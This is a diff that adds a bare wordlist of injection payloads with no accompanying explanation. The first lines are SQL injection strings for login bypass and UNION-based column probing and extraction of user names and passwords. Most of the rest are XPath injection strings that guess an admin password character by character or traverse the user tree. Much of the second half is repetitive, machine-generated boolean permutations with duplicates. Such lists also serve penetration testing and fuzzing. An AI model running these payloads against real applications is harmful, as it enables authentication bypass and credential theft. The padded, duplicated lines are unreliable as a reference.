@@ -1,0 +1,218 @@
+' or '1'='1
+' or '1'='1' --
+' or '1'='1' #
+' or 1=1 --
+' or 1=1 #
+" or "1"="1
+" or "1"="1" --
+') or ('1'='1
+') or ('1'='1' --
+' or 'x'='x
+' or 'x'='x' --
+' or 1=1 and '1'='1
+' or 1=1 and '1'='2
+' or 1=1 order by 1 --
+' or 1=1 order by 2 --
+' or 1=1 order by 3 --
+' union select null --
+' union select null, null --
+' union select null, null, null --
+' union select 1,2,3 --
+' union select 1,2,3,4 --
+' union select 1,2,3,4,5 --
+' union select 'admin','password' --
+' union select name, password from users --
+' union select 'admin', 'password' from users where '1'='1
+' or exists(//user[username='admin']) --
+' or exists(//user[password='123']) --
+' or count(//user) > 0 --
+' or count(//user) = 1 --
+' or count(//user) < 10 --
+' or string-length(//user[username='admin']/password) > 0 --
+' or string-length(//user[username='admin']/password) = 8 --
+' or substring(//user[username='admin']/password,1,1) = 'a' --
+' or substring(//user[username='admin']/password,1,1) = 'b' --
+' or contains(//user[username='admin']/password, 'pass') --
+' or starts-with(//user[username='admin']/password, 'pa') --
+' or ends-with(//user[username='admin']/password, 'word') --
+' or //user[username='admin']/password = 'password' --
+' or //user[username='admin']/password != '' --
+' or //user[username='admin']/password > '' --
+' or //user[username='admin']/password < 'zzz' --
+' or //user[username='admin']/password = 'password' or '1'='1
+' or //user[username='admin']/password = 'password' and '1'='1
+' or //user[username='admin']/password = 'password' or '1'='2
+' or //user[username='admin']/password = 'password' and '1'='2
+' or //user[username='admin'] or //user[username='root'] --
+' or //user[username='admin'] and //user[password='123'] --
+' or //user[username='admin'] or //user[username='guest'] --
+' or //user[username='admin'] and not(//user[username='guest']) --
+' or //user[username='admin'] | //user[username='root'] --
+' or //user[username='admin']/parent::* --
+' or //user[username='admin']/child::* --
+' or //user[username='admin']/following-sibling::* --
+' or //user[username='admin']/preceding-sibling::* --
+' or //user[username='admin']/ancestor::* --
+' or //user[username='admin']/descendant::* --
+' or //user[username='admin']/attribute::* --
+' or //user[username='admin']/@* --
+' or //user[username='admin']/text() = 'admin' --
+' or //user[username='admin']/text() != '' --
+' or //user[username='admin']/comment() --
+' or //user[username='admin']/processing-instruction() --
+' or //user[username='admin']/namespace::* --
+' or //user[username='admin']/self::* --
+' or //user[username='admin']/descendant-or-self::* --
+' or //user[username='admin']/ancestor-or-self::* --
+' or //user[username='admin']/following::* --
+' or //user[username='admin']/preceding::* --
+' or //user[username='admin']/following-sibling::node() --
+' or //user[username='admin']/preceding-sibling::node() --
+' or //user[position()=1] --
+' or //user[position()=2] --
+' or //user[position()<3] --
+' or //user[position()>2] --
+' or //user[position()<=2] --
+' or //user[position()>=2] --
+' or //user[last()] --
+' or //user[last()-1] --
+' or //user[last()-2] --
+' or //user[1] --
+' or //user[2] --
+' or //user[0] --
+' or //user[count(*)>0] --
+' or //user[count(*) > 0] --
+' or //user[count(*) = 1] --
+' or //user[count(*) < 2] --
+' or //user[count(//user) > 0] --
+' or //user[not(//user)] --
+' or //user[true()] --
+' or //user[false()] --
+' or //user[true() and true()] --
+' or //user[true() or false()] --
+' or //user[not(false())] --
+' or //user[true() xor false()] --
+' or //user[true() and false()] --
+' or //user[not(true())] --
+' or //user[false() or false()] --
+' or //user[true() or true()] --
+' or //user[true() and true() and true()] --
+' or //user[true() or (true() and false())] --
+' or //user[(true() or false()) and true()] --
+' or //user[(true() and false()) or true()] --
+' or //user[true() or true() or true()] --
+' or //user[true() and (false() or true())] --
+' or //user[(true() or false()) and (true() or false())] --
+' or //user[true() or (true() and (true() or false()))] --
+' or //user[true() and (false() or (true() and true()))] --
+' or //user[(true() or (false() and true())) and (true() or false())] --
+' or //user[(true() and (true() or false())) or (false() and true())] --
+' or //user[(true() or false()) and (true() or (false() and true()))] --
+' or //user[(true() and (false() or true())) or (false() and (true() or false()))] --
+' or //user[1=1] --
+' or //user[1=2] --
+' or //user[1>0] --
+' or //user[1<2] --
+' or //user[1>=1] --
+' or //user[1<=1] --
+' or //user[1!=2] --
+' or //user[1+1=2] --
+' or //user[1-1=0] --
+' or //user[1*1=1] --
+' or //user[1/1=1] --
+' or //user[1 mod 1=0] --
+' or //user[1 div 1=1] --
+' or //user[1 and 1] --
+' or //user[1 and 0] --
+' or //user[1 or 0] --
+' or //user[1 or 1] --
+' or //user[not(1=2)] --
+' or //user[not(1=1)] --
+' or //user[(1=1) and (2=2)] --
+' or //user[(1=1) or (1=2)] --
+' or //user[(1=2) or (1=1)] --
+' or //user[(1=1) and (2=2) or (3=3)] --
+' or //user[(1=1) or (2=2) and (3=3)] --
+' or //user[(1=1) and ((2=2) or (3=3))] --
+' or //user[((1=1) or (2=2)) and (3=3)] --
+' or //user[(1=1) or (2=2) or (3=3) or (4=4)] --
+' or //user[(1=1) and (2=2) and (3=3) and (4=4)] --
+' or //user[(1=1) or (2=2) and (3=3) or (4=4)] --
+' or //user[(1=1) and (2=2) or (3=3) and (4=4)] --
+' or //user[(1=1) or (2=2) or (3=3) and (4=4)] --
+' or //user[(1=1) and (2=2) or (3=3) or (4=4)] --
+' or //user[(1=1) or (2=2) and (3=3) or (4=4)] --
+' or //user[(1=1) and (2=2) and (3=3) or (4=4)] --
+' or //user[(1=1) or (2=2) and (3=3) and (4=4)] --
+' or //user[(1=1) and (2=2) or (3=3) and (4=4) or (5=5)] --
+' or //user[(1=1) or (2=2) and (3=3) or (4=4) and (5=5)] --
+' or //user[(1=1) and (2=2) or (3=3) and (4=4) or (5=5) and (6=6)] --
+' or //user[(1=1) or (2=2) and (3=3) or (4=4) and (5=5) or (6=6)] --
+' or //user[1 and 1 and 1 and 1] --
+' or //user[1 or 1 or 1 or 1] --
+' or //user[1 and 1 or 1 and 1] --
+' or //user[1 or 1 and 1 or 1] --
+' or //user[1 and 1 and 1 or 1] --
+' or //user[1 or 1 or 1 and 1] --
+' or //user[(1 and 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) and (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 and 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) and (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) or (1 and 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) and (1 and 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) and (1 or 1) and (1 and 1)] --
+' or //user[(1 or 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) and (1 or 1) or (1 or 1)] --
+' or //user[(1 or 1) or (1 and 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 or 1) and (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 and 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) and (1 or 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) and (1 or 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) and (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 or 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1) and (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 and 1) and (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 or 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) and (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 and 1) and (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 or 1) and (1 and 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 or 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 and 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 or 1) or (1 and 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 and 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 or 1) or (1 or 1)] --
+' or //user[(1 and 1) or (1 or 1) or (1 or 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 and 1) or (1 and 1) or (1 and 1)] --
+' or //user[(1 and 1) or (1 and 1) or (1 or 1) or (1 or 1)] --
+' or //user[(1 or 1) and (1 or 1) or (1 and 1) or (1 and 1)] --
